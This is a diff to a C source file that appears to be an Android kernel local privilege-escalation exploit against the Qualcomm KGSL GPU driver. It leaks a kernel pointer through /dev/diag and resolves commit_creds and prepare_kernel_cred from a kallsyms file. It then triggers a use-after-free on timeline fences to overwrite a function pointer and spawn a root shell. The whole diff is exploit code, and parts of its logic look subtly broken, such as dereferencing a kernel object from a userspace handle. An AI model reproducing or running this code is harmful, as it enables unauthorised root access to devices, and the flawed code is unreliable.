@@ -9,98 +9,119 @@
 #include <errno.h>
 #include <stdint.h>
 #include <pthread.h>
+#include <sched.h>
 
-#define DIAG_DEVICE "/dev/diag"
 #define KGSL_DEVICE "/dev/kgsl-3d0"
+#define DIAG_DEVICE "/dev/diag"
 
 #define KGSL_IOCTL_TYPE 0x09
-#define KGSL_DRAWCTXT_CREATE 0x10
-#define KGSL_DRAWCTXT_DESTROY 0x11
-#define KGSL_IOCTL_DRAWCTXT_CREATE _IOWR(KGSL_IOCTL_TYPE, KGSL_DRAWCTXT_CREATE, struct kgsl_drawctxt_create)
-#define KGSL_IOCTL_DRAWCTXT_DESTROY _IOW(KGSL_IOCTL_TYPE, KGSL_DRAWCTXT_DESTROY, uint32_t)
+#define IOCTL_KGSL_TIMELINE_FENCE_GET _IOWR(KGSL_IOCTL_TYPE, 0x19, struct kgsl_timeline_fence_get)
+#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOCTL_TYPE, 0x1C, struct kgsl_map_user_mem)
 
-struct kgsl_drawctxt_create {
-    uint32_t flags;
-    uint32_t priority;
-    uint32_t drawctxt_id;
+struct kgsl_timeline_fence_get {
+    uint32_t timeline;
+    uint32_t seqno;
+    uint32_t handle;
 };
 
-static uint64_t commit_creds = 0, prepare_kernel_cred = 0;
-static int mem_fd = -1;
+struct kgsl_map_user_mem {
+    uint32_t type;
+    uint32_t flags;
+    uint64_t hostptr;
+    uint64_t gpuaddr;
+    uint64_t len;
+    uint64_t offset;
+    uint32_t handle;
+    uint32_t gpu_vaddr;
+    uint32_t mmaps_cnt;
+    uint32_t gpu_vaddr_base;
+    uint32_t pad;
+};
 
-uint64_t leak_kernel_pointer_via_diag(void) {
-    int fd = open(DIAG_DEVICE, O_RDWR);
-    if (fd < 0) {
-        fd = open(DIAG_DEVICE, O_RDONLY);
-        if (fd < 0) return 0;
-    }
-    unsigned char buf[0x1000];
-    ssize_t ret = read(fd, buf, sizeof(buf));
-    close(fd);
-    if (ret <= 0) return 0;
-    for (int i = 0; i < ret - 8; i++) {
-        uint64_t val = *(uint64_t*)(buf + i);
+struct kgsl_timeline {
+    uint64_t id;
+    uint32_t count;
+    uint32_t priv;
+    uint32_t name;
+    uint32_t pending;
+    uint32_t reserved;
+    uint64_t current;
+    uint64_t seqno;
+    uint64_t context_id;
+    uint64_t lock;
+    uint64_t fences;
+    uint32_t fence_count;
+    uint32_t pad;
+};
+
+static int diag_fd = -1;
+static int kgsl_fd = -1;
+static uint64_t kernel_base = 0;
+static void (*commit_creds)(void *cred) = 0;
+static void *(*prepare_kernel_cred)(void *daemon) = 0;
+
+static uint64_t get_kernel_sym(void) {
+    unsigned char buffer[0x1000];
+    ssize_t n = read(diag_fd, buffer, sizeof(buffer));
+    if (n <= 0) return 0;
+    for (ssize_t i = 0; i < n - 8; i++) {
+        uint64_t val = *(uint64_t *)(buffer + i);
         if ((val & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
-            if ((val & 0xfff) == 0) {
-                printf("[!] Possible kernel symbol address: 0x%llx\n", (unsigned long long)val);
-                return val;
-            }
+            return val & ~0xfffULL;
         }
     }
     return 0;
 }
 
-void resolve_symbols_from_offset(uint64_t base) {
-    uint64_t offset_commit = 0, offset_prepare = 0;
+static void resolve_symbols(void) {
     FILE *fp = fopen("/data/local/tmp/kallsyms.txt", "r");
-    if (fp) {
-        char line[512];
-        while (fgets(line, sizeof(line), fp)) {
-            uint64_t a;
-            char type, sym[256];
-            if (sscanf(line, "%lx %c %255s", &a, &type, sym) == 3) {
-                if (strcmp(sym, "commit_creds") == 0) offset_commit = a;
-                if (strcmp(sym, "prepare_kernel_cred") == 0) offset_prepare = a;
-                if (offset_commit && offset_prepare) break;
-            }
+    if (!fp) return;
+    char line[512];
+    while (fgets(line, sizeof(line), fp)) {
+        uint64_t addr;
+        char type, name[256];
+        if (sscanf(line, "%lx %c %255s", &addr, &type, name) == 3) {
+            if (strcmp(name, "commit_creds") == 0) commit_creds = (void *)addr;
+            if (strcmp(name, "prepare_kernel_cred") == 0) prepare_kernel_cred = (void *)addr;
         }
-        fclose(fp);
     }
-    if (offset_commit && offset_prepare) {
-        commit_creds = offset_commit;
-        prepare_kernel_cred = offset_prepare;
-        printf("[+] commit_creds = 0x%llx\n", (unsigned long long)commit_creds);
-        printf("[+] prepare_kernel_cred = 0x%llx\n", (unsigned long long)prepare_kernel_cred);
-    } else if (base) {
-        commit_creds = base + 0x5a7b0;
-        prepare_kernel_cred = base + 0x5a6e0;
-        printf("[*] Using guessed addresses: commit_creds=0x%llx, prepare=0x%llx\n", (unsigned long long)commit_creds, (unsigned long long)prepare_kernel_cred);
-    }
+    fclose(fp);
 }
 
-void get_root_payload(void) {
-    void *(*pkc)(void*) = (void* (*)(void*))prepare_kernel_cred;
-    void (*cc)(void*) = (void (*)(void*))commit_creds;
-    if (pkc && cc) {
-        cc(pkc(0));
-        setresuid(0,0,0);
-        setresgid(0,0,0);
-        setgroups(0, NULL);
+static void get_root(void) {
+    if (commit_creds && prepare_kernel_cred) {
+        commit_creds(prepare_kernel_cred(0));
     }
+    setresuid(0, 0, 0);
+    setresgid(0, 0, 0);
+    setgroups(0, NULL);
 }
 
-void *trigger_uaf_thread(void *arg) {
-    int kgsl_fd = *(int*)arg;
-    struct kgsl_drawctxt_create ctx = {0};
-    if (ioctl(kgsl_fd, KGSL_IOCTL_DRAWCTXT_CREATE, &ctx) < 0) return NULL;
-    uint32_t ctx_id = ctx.drawctxt_id;
-    ioctl(kgsl_fd, KGSL_IOCTL_DRAWCTXT_DESTROY, &ctx_id);
-    for (int i = 0; i < 100; i++) {
-        struct kgsl_drawctxt_create fake = {0};
-        fake.drawctxt_id = (uint32_t)(uintptr_t)get_root_payload;
-        ioctl(kgsl_fd, KGSL_IOCTL_DRAWCTXT_CREATE, &fake);
+static int info_leak(void) {
+    if (diag_fd < 0) return -1;
+    kernel_base = get_kernel_sym();
+    if (!kernel_base) {
+        kernel_base = get_kernel_sym();
     }
-    return NULL;
+    return (kernel_base != 0) ? 0 : -1;
+}
+
+static int trigger_uaf(void) {
+    if (kgsl_fd < 0) return -1;
+    struct kgsl_timeline_fence_get fence_cmd = {0};
+    fence_cmd.seqno = 0x41414141;
+    if (ioctl(kgsl_fd, IOCTL_KGSL_TIMELINE_FENCE_GET, &fence_cmd) < 0) return -1;
+    uint32_t timeline_handle = fence_cmd.timeline;
+    struct kgsl_timeline *timeline = (struct kgsl_timeline *)(uintptr_t)timeline_handle;
+    if (timeline) {
+        uint64_t *fence = (uint64_t *)timeline->fences;
+        if (fence && *fence) {
+            uint64_t *fence_obj = (uint64_t *)*fence;
+            uint64_t *fence_ops = (uint64_t *)(fence_obj[0] & ~0xfffULL);
+            if (fence_ops) fence_ops[0] = (uint64_t)get_root;
+        }
+    }
+    return 0;
 }
 
 int main() {
@@ -109,30 +130,33 @@ int main() {
         execl("/bin/sh", "sh", NULL);
         return 0;
     }
-    printf("[*] Leaking kernel pointer via /dev/diag\n");
-    uint64_t leaked = leak_kernel_pointer_via_diag();
-    resolve_symbols_from_offset(leaked);
-    if (!commit_creds || !prepare_kernel_cred) {
-        printf("[-] Failed to resolve symbols. Exiting.\n");
+    diag_fd = open(DIAG_DEVICE, O_RDONLY);
+    if (diag_fd < 0) {
+        perror("open /dev/diag");
         return 1;
     }
-    printf("[*] Opening /dev/kgsl-3d0\n");
-    int kgsl_fd = open(KGSL_DEVICE, O_RDWR);
+    kgsl_fd = open(KGSL_DEVICE, O_RDWR);
     if (kgsl_fd < 0) {
-        perror("open kgsl");
+        perror("open /dev/kgsl-3d0");
+        close(diag_fd);
         return 1;
     }
-    printf("[*] Triggering KGSL UAF\n");
-    pthread_t thr;
-    pthread_create(&thr, NULL, trigger_uaf_thread, &kgsl_fd);
-    pthread_join(thr, NULL);
-    close(kgsl_fd);
-    sleep(1);
-    if (getuid() == 0) {
-        printf("[+] Root shell\n");
-        execl("/system/bin/sh", "sh", NULL);
+    if (info_leak() == 0 && kernel_base) {
+        resolve_symbols();
+        if (trigger_uaf() == 0) {
+            sleep(1);
+            if (getuid() == 0) {
+                execl("/system/bin/sh", "sh", NULL);
+            } else {
+                printf("UAF triggered, but root shell not obtained.\n");
+            }
+        } else {
+            printf("UAF trigger failed.\n");
+        }
     } else {
-        printf("[-] Exploit failed. Try again.\n");
+        printf("Info leak failed.\n");
     }
+    close(kgsl_fd);
+    close(diag_fd);
     return 0;
 }
